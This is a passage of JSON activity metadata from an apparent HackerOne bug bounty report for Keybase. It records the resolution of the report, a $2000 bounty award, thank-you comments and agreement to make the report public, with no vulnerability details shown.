OK!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-06T07:17:57.058Z","updated_at":"2019-02-06T07:17:57.058Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4103037,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-06T13:59:58.838Z","updated_at":"2019-02-06T13:59:58.838Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"u3mur4","url":"/u3mur4"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4103039,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-06T14:00:12.909Z","updated_at":"2019-02-06T14:00:12.909Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"u3mur4","url":"/u3mur4"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4103682,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","markdown_message":"\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-06T15:58:36.790Z","updated_at":"2019-02-06T15:58:36.790Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4103694,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the great work!","markdown_message":"\u003cp\u003eThank you for the great work!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-06T16:01:01.392Z","updated_at":"2019-02-06T16:01:01.392Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6847410,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-23T07:13:03.519Z","updated_at":"2020-01-23T07:13:03.519Z","first_to_agree":true,"actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6866271,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-24T23:20:42.510Z","updated_at":"2020-01-24T23:20:42.510Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6866272,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-24T23:20:42.573Z","updated_at":"2020-01-24T23:20:42.573Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}